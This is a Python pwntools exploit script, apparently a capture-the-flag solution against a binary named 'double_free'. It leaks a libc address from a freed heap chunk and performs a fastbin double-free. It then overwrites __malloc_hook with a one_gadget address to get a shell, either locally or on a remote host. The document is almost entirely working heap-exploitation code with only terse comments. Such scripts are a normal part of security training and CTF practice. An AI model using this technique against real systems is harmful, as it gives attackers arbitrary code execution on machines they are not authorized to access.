from pwn import *

def add(size,name,exp=3):

    r.sendline("1")
    r.recvline("")
    r.sendline(str(size))
    r.recvline("")
    r.sendline(str(name))
    r.recvline("")
    r.sendline(str(exp))
def show_expert():

    r.sendline("3")
    r.recvuntil("Expert:")
def free(idx):

    r.sendline("2")
    r.recvline("")
    r.sendline(str(idx))

def exploit(r):
    r.recvline("")

    #create a 2 small chunk 
    add(10,"AAA","3")#0
    add(10,"BBB","3")#1

    #heap start form here 0x603420
    #now it is gonna leak the FD after we free the first chunk
    
    free(0)
    show_expert()
    data = r.recv(6)
    data += "\x00" *(8 - len(data))
    un = u64(data)
    libc_base = un - 0x3c4b78 #0x3c4b78
    #0x4526a, 0xf02a4 , 0xf1147 , 0x45216
    one_shot = libc_base + 0xf02a4

    log.info("leak : " + hex(un))

    
    log.info("libc base : " + hex(libc_base))

    log.info("one shot " + hex(one_shot))
    #now let's clean a little bit
    free(1)
    #perform a double free and fastbin attack first we need to allocated 2 fast chunk size 0x68 bytes
    add(102,"CCC","3")#2
    add(102,"DDD","3")#3
    free(3)
    free(2)
    free(3)

    
    hook_of = 0x3c4b10
    hook = libc_base + hook_of 
    payload = p64(hook-0x23)

    log.info("malloc hook " + hex(hook))

    add(102,payload,3)#5
    add(102,"d",3)#6
    add(102,"C",3)#7
    add(102,"\x00"*19+p64(one_shot),3)
    free(0)
    free(0)

    r.interactive()
if __name__ == '__main__':

    if(len(sys.argv) > 1):

        r = remote(HOST,PORT)

        exploit(r)
    else:
        file = 'double_free'
        binary = os.getcwd() + '/' + str(file)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        r = process(binary)
        print(util.proc.pidof(r))
        pause()
        exploit(r)
